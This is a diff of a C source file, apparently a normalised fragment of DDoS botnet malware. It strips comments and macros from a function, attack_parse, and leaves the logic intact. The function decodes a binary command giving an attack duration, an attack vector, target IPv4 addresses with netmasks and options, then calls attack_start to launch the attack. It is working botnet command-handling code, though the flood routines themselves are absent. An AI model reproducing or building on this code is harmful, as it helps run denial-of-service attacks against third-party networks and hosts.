@@ -1,35 +1,35 @@
-#define NULL ((void*)0)
-typedef unsigned long size_t;  // Customize by platform.
+
+typedef unsigned long size_t;
 typedef long intptr_t; typedef unsigned long uintptr_t;
-typedef long scalar_t__;  // Either arithmetic or pointer type.
-/* By default, we understand bool (as a convenience). */
+typedef long scalar_t__;
+
 typedef int bool;
-#define false 0
-#define true 1
 
-/* Forward declarations */
-typedef  struct TYPE_4__   TYPE_2__ ;
-typedef  struct TYPE_3__   TYPE_1__ ;
 
-/* Type definitions */
-typedef  int uint8_t ;
-typedef  int /*<<< orphan*/  uint32_t ;
-struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
-struct TYPE_4__ {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
-struct attack_target {int netmask; int /*<<< orphan*/  addr; TYPE_2__ sock_addr; } ;
+
+
+typedef struct TYPE_4__ TYPE_2__ ;
+typedef struct TYPE_3__ TYPE_1__ ;
+
+
+typedef int uint8_t ;
+typedef int uint32_t ;
+struct TYPE_3__ {int s_addr; } ;
+struct TYPE_4__ {TYPE_1__ sin_addr; int sin_family; } ;
+struct attack_target {int netmask; int addr; TYPE_2__ sock_addr; } ;
 struct attack_option {int key; void* val; } ;
-typedef  int /*<<< orphan*/  ipv4_t ;
-typedef  scalar_t__ ATTACK_VECTOR ;
+typedef int ipv4_t ;
+typedef scalar_t__ ATTACK_VECTOR ;
 
-/* Variables and functions */
- int /*<<< orphan*/  AF_INET ; 
- int /*<<< orphan*/  attack_start (int /*<<< orphan*/ ,scalar_t__,int,struct attack_target*,int,struct attack_option*) ; 
- void* calloc (int,int) ; 
- scalar_t__ errno ; 
- int /*<<< orphan*/  free (struct attack_target*) ; 
- int /*<<< orphan*/  free_opts (struct attack_option*,int) ; 
- int /*<<< orphan*/  ntohl (int /*<<< orphan*/ ) ; 
- int /*<<< orphan*/  util_memcpy (void*,char*,int) ; 
+
+ int AF_INET ;
+ int attack_start (int ,scalar_t__,int,struct attack_target*,int,struct attack_option*) ;
+ void* calloc (int,int) ;
+ scalar_t__ errno ;
+ int free (struct attack_target*) ;
+ int free_opts (struct attack_option*,int) ;
+ int ntohl (int ) ;
+ int util_memcpy (void*,char*,int) ;
 
 void attack_parse(char *buf, int len)
 {
@@ -37,23 +37,23 @@ void attack_parse(char *buf, int len)
     uint32_t duration;
     ATTACK_VECTOR vector;
     uint8_t targs_len, opts_len;
-    struct attack_target *targs = NULL;
-    struct attack_option *opts = NULL;
+    struct attack_target *targs = ((void*)0);
+    struct attack_option *opts = ((void*)0);
 
-    // Read in attack duration uint32_t
+
     if (len < sizeof (uint32_t))
         goto cleanup;
     duration = ntohl(*((uint32_t *)buf));
     buf += sizeof (uint32_t);
     len -= sizeof (uint32_t);
 
-    // Read in attack ID uint8_t
+
     if (len == 0)
         goto cleanup;
     vector = (ATTACK_VECTOR)*buf++;
     len -= sizeof (uint8_t);
 
-    // Read in target count uint8_t
+
     if (len == 0)
         goto cleanup;
     targs_len = (uint8_t)*buf++;
@@ -61,7 +61,7 @@ void attack_parse(char *buf, int len)
     if (targs_len == 0)
         goto cleanup;
 
-    // Read in all targs
+
     if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
         goto cleanup;
     targs = calloc(targs_len, sizeof (struct attack_target));
@@ -76,13 +76,13 @@ void attack_parse(char *buf, int len)
         targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
     }
 
-    // Read in flag count uint8_t
+
     if (len < sizeof (uint8_t))
         goto cleanup;
     opts_len = (uint8_t)*buf++;
     len -= sizeof (uint8_t);
 
-    // Read in all opts
+
     if (opts_len > 0)
     {
         opts = calloc(opts_len, sizeof (struct attack_option));
@@ -90,13 +90,13 @@ void attack_parse(char *buf, int len)
         {
             uint8_t val_len;
 
-            // Read in key uint8
+
             if (len < sizeof (uint8_t))
                 goto cleanup;
             opts[i].key = (uint8_t)*buf++;
             len -= sizeof (uint8_t);
 
-            // Read in data length uint8
+
             if (len < sizeof (uint8_t))
                 goto cleanup;
             val_len = (uint8_t)*buf++;
@@ -114,10 +114,10 @@ void attack_parse(char *buf, int len)
     errno = 0;
     attack_start(duration, vector, targs_len, targs, opts_len, opts);
 
-    // Cleanup
+
     cleanup:
-    if (targs != NULL)
+    if (targs != ((void*)0))
         free(targs);
-    if (opts != NULL)
+    if (opts != ((void*)0))
         free_opts(opts, opts_len);
 }
